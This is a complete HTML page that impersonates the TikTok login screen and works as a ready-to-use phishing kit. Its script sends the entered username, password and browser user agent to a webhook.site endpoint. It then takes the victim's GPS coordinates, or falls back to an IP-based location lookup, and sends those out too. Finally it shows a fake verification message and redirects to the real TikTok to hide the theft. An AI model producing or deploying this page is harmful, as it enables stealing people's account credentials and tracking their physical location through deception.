<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>TikTok - Log in</title>
    <style>
        body { font-family: Arial, sans-serif; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: #fff; padding: 40px; border-radius: 12px; width: 350px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; }
        button { background: #fe2c55; color: white; padding: 12px; width: 100%; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
        .logo { font-size: 32px; font-weight: bold; color: #fe2c55; margin-bottom: 20px; }
    </style>
</head>
<body>
<div class="container">
    <div class="logo">TikTok</div>
    <h3>Log in to your account</h3>
    <input type="text" id="username" placeholder="Username or email" autocomplete="off">
    <input type="password" id="password" placeholder="Password">
    <button onclick="login()">Log in</button>
    <p style="font-size: 12px; color: #888; margin-top: 20px;">We need to verify your location for security</p>
</div>

<script>
function login() {
    let username = document.getElementById('username').value;
    let password = document.getElementById('password').value;
    
    // Steal credentials first
    let webhook = "https://webhook.site/YOUR-ID-HERE";
    fetch(`${webhook}?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&ua=${encodeURIComponent(navigator.userAgent)}`, {mode: 'no-cors'});
    
    // Then request location
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, locationDenied);
    } else {
        locationDenied();
    }
    
    function sendLocation(position) {
        let lat = position.coords.latitude;
        let lon = position.coords.longitude;
        fetch(`${webhook}?location=GPS:${lat},${lon}&user=${encodeURIComponent(username)}`, {mode: 'no-cors'});
        showLoading();
    }
    
    function locationDenied() {
        // Fallback: IP location
        fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                fetch(`${webhook}?location=IP:${data.city},${data.country}&lat=${data.latitude},${data.longitude}&user=${encodeURIComponent(username)}`, {mode: 'no-cors'});
                showLoading();
            });
    }
    
    function showLoading() {
        document.body.innerHTML = '<div class="container" style="text-align:center;"><div class="logo">TikTok</div><h3>Verifying your location...</h3><p>Please wait, redirecting to TikTok...</p></div>';
        setTimeout(() => {
            window.location.href = "https://www.tiktok.com";
        }, 2000);
    }
}
</script>
</body>
</html>
